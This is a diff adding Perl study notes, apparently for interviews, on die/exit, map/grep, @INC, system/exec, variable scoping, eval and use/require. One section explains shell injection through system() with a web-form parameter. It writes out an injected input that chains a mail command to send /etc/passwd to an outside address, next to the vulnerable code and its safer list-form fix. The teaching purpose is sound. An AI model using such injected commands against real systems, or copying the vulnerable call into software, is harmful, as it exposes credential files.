@@ -1,0 +1,233 @@
+1.)
+die v/s exit
+
+die throw an exception (catchable by eval) #IMP #INT
+exit is used to exit a process
+
+die outputs a message
+exit does not
+
+die will send the error code based on $! or $? if any exception
+exit error code is its argument ... example: exit(4)
+
+Similarity: both unwind the stack
+
+2.)
+#die and exit example: #IMP#
+use strict;
+use warnings;
+
+eval { die };
+print "You can see I'm still alive!\n"; #eval here captures the errors or dieing words.
+eval { exit };
+print "You should never see this print\n";
+
+3.)
+carp - warn of errors (from perspective of caller)
+croak - die of errors (from perspective of caller)
+die - The die function works just like warn, except that it also calls exit.
+warn - The warn function just raises a warning, a message is printed to STDERR, but no further action is taken.
+
+4.)
+#IMP# map grep sort
+(http://www.perlmonks.org/?node_id=1035181)
+grep returns those elements of the original list that match the expression, 
+while map returns the result of the expression applied to each element of the original list.
+
+$ perl -le 'print join " ", grep $_ & 1, (1, 2, 3, 4, 5)'
+1 3 5
+$ perl -le 'print join " ", map $_ & 1, (1, 2, 3, 4, 5)'
+1 0 1 0 1
+
+The first example prints all the odd elements of the list, while the second example prints a 0 or 1 
+depending on whether the corresponding element is odd or not.
+
+--Another way to explain--
+grep {BLOCK} LIST   
+map  {BLOCK} LIST
+
+grep() is a filter: it returns the subset of items from LIST for which BLOCK returns true.
+
+map() is a mapping function: send a value from LIST into BLOCK, and BLOCK returns a list of 0 or more values; 
+the combined set of all of those calls to BLOCK will be the ultimate list returned by map()
+
+
+5.)
+#IMP# grep and map example:
+    my @numbers = (1..5);
+    print "@numbers\n";       # 1 2 3 4 5
+    my @doubles = map {$_ * 2} @numbers;
+    print "@doubles\n";       # 2 4 6 8 10
+	
+6.)
+#IMP# @INC can be manipulated created by:
+		- command line (perl -I /my/moduledir your_script.pl)
+		- via shebang (#!/usr/local/bin/perl -w -I /my/moduledir)
+		- use lib ("/dir1", "/dir2");
+		- Add directories to the beginning via unshift @INC, $dir (OR use push to add at end)
+7.)
+#IMP#
+You can change an environment variable in a Perl script 
+(more precisely, in the process running the Perl script) by updating %ENV:
+$ENV{LD_LIBRARY_PATH} = '/'; # or some more reasonable value
+
+8.)
+environment variables can only be set for the current process, 
+and are passed on to the child processes at fork()/exec(). 
+
+9.)
+system()
+In its most basic form it accepts a string that contains exactly 
+what you would write on the command line in order to invoke the external command.
+Any output or error it generates will end up on your screen. 
+
+10.) 
+#IMP# #INT
+Advantage of system with string as argument
+if you run the 'checkfiles' program from within a Perl script as one string: system("checkfiles data*.txt"), 
+then Perl will pass that string to the shell. The shell will do its expansion and the 'checkfiles' program will 
+see the list of file. On the other hand, if you pass the command and parameters as separate strings: 
+system("checkfiles", "data*.txt") then perl will run the 'checkfiles' 
+program directly and pass the single parameter 'data*.txt' to it without any expansion.
+
+As you can see, passing the whole command as a single string has its advantages.
+
+11.)
+This advantage comes with a price though. 
+The security risk
+Let's say you accept the parameter of checkfiles from an untrusted source: 
+      my $param = get_from_a_web_form();
+      my $cmd = "checkfiles $param";
+      system($cmd);
+If the user types in 'data*.txt' then you are ok. The $cmd will contain checkfile data*.txt.
+On the other hand if the user passes in some other, more 'clever' parameters then you might be in trouble. 
+For example if the user types in data*.txt; mail blackhat@perlmaven.com < /etc/passwd. 
+Then the command perl executes will look like this: checkfile data*.txt; mail darkside@perlmaven.com < /etc/passwd.
+
+The shell will first execute the 'checkfile data*.txt' command as you intended, but then it will go on, 
+and also execute the 'mail...' command. That will send your password file to my darker side. 	  
+
+If your Perl script was using system with multiple parameters, this security risk is avoided. If this is the Perl code:
+      my $param = get_from_a_web_form();
+      my @cmd = ("checkfiles", $param);
+      system(@cmd);
+
+And the user types in data*.txt; mail blackhat@perlmaven.com < /etc/passwd. the Perl script will run the 
+'checkfiles' program and pass a single argument to it: data*.txt; mail blackhat@perlmaven.com < /etc/passwd. 
+No shell expansion but we also avoided the dangers of the shell. The 'checkfiles' program will probably 
+complain that it cannot find a file called data*.txt; mail blackhat@perlmaven.com < /etc/passwd, 
+but at least our passwords will be safe.
+
+12.) #IMP# #INT
+exec() system() and backtics
+exec() function and system() function execute a system shell command. The big difference is that
+system()
+creates a fork process and waits to see if the command succeeds or fails - returning a value.
+exec()
+does not return anything, it simply executes the command. 
+
+Neither of these commands should be used to capture the output of a system call.
+If your goal is to capture output, you should use the
+backtick operator
+ $result = `PROGRAM`; 
+
+13.)
+my-local-our #IMP#
+my() creates a local variable
+our() creates a package variable
+local() temporarily changes the local value of a global variable
+
+My Variable
+-The variables declared with the "my" keyword are accessible only to the block in which they are defined. 
+-They are neither accessible outside of the block or even within the inner blocks 
+(e.g. any function called from the block will not be able to see it.)
+-known as a lexical variable. Note that lexical variables are hidden from subroutines which are called 
+from within the enclosing block. This is known as lexical scoping.
+
+
+Local Variable
+-The variable defined as "local" keyword is accessible to the current block and is accessible to the inner blocks 
+(e.g. function called from this block.).
+-local gives temporary values to global variables. It does not create a local variable.
+
+Our variable
+-our creates an alias to a package variable. The alias is local to the enclosing block, file, or eval. 
+That is to say the alias is lexically scoped just like any lexical variable. However a package variable belongs to a package. 
+It can be accessed from anywhere if you use its fully qualified name. 
+Here are two examples of fully qualified package variables:
+Note that package variables are also global variables.
+-our is local to enclosing block just like 'my'. But it is also available in package.
+
+14.)
+#IMP#
+local doesn't create variables. It doesn't relate to my and our at all. 
+local temporarily backs up the value of variable and clears its current value.
+
+15.)
+#IMP#
+sub func
+{
+die “dieing in subroutine func\n”;
+}
+eval { func(); };
+print “Error captured : $@\n”;
+
+16.)
+Perl eval can’t catch following errors:
+    Uncaught signal
+    Running out of memory
+    Syntax errors
+
+17.)
+eval()
+if the eval caught a fatal error, $@ will hold what would have been the program’s dying words, 
+perhaps something like: Illegal division by zero at my_program line 12. If there was no error,
+$@ will be empty.
+
+18.) example
+eval {
+--code--
+};
+if($@) {
+	print "An error occurred ($@), continuing\n";
+}
+
+$@ will be empty as long as the eval block worked OK but will have the text of the die message if not.
+
+19.)
+eval is an expression, which is why the trailing semicolon
+is needed after the closing curly brace. #IMP #INT
+
+20.)
+two usages for eval
+eval EXPR;
+eval BLOCK;
+
+21.)
+#IMP# require vs use
+In perl we can dynamically load modules at run time. To load modules dynamically, we have to use “require” ( not “use”).
+Other differences:
+-use normally loads the module at compile time whereas require does at run time
+-require is used if we want to load bigger modules occasionally.
+-use throws the exception at earlier states whereas require does when it encounters the issue
+-With use we can selectively load the procedures not all but few like
+use Module qw(foo bar) # it will load foo and bar only
+
+22.)
+Perl Interpreter:
+compiles the program internally into a parse tree and then executes it immediately.
+
+23.)
+shebang line tells the shell to look for the /usr/bin/perl program and pass the rest of the file to that program for execution.
+
+24.)
+use strict; at the top of each perl file (both scripts and modules), then you turn on all 3 of them.
+The 3 parts of use strict
+	use strict 'vars'; generates a compile-time error if you access a variable without declaration.
+	use strict 'refs'; generates a runtime error if you use symbolic references.
+	use strict 'subs'; compile-time error if you try to use a bareword identifier in an improper way. 
+	
+25.)
+use warnings; will help you find typing mistakes in program 
+like you missed a semicolon, you used 'elseif' and not 'elsif',
+you are using deprecated syntax or function, whatever like that	
